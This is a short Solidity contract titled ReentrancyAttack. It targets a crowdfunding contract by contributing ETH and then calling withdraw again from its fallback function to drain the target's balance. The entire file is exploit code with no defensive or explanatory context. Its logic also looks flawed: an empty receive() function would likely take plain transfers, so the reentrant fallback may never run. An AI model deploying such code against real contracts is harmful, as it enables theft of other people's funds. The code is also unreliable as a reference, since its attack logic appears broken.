// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICrowdfunding {
    function contribute(uint256 _campaignId) external payable;
    function withdraw(uint256 _campaignId) external;
}

contract ReentrancyAttack {
    ICrowdfunding public crowdfunding;
    uint256 public targetCampaignId;

    constructor(address _crowdfundingAddress, uint256 _campaignId) {
        crowdfunding = ICrowdfunding(_crowdfundingAddress);
        targetCampaignId = _campaignId;
    }

    // Fallback function to trigger reentrancy
    fallback() external payable {
        if (address(crowdfunding).balance > 0) {
            crowdfunding.withdraw(targetCampaignId);
        }
    }

    // Receive Ether without data
    receive() external payable {
        // Intentionally left blank to accept plain Ether transfers
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        crowdfunding.contribute{value: msg.value}(targetCampaignId);
        crowdfunding.withdraw(targetCampaignId);
    }
}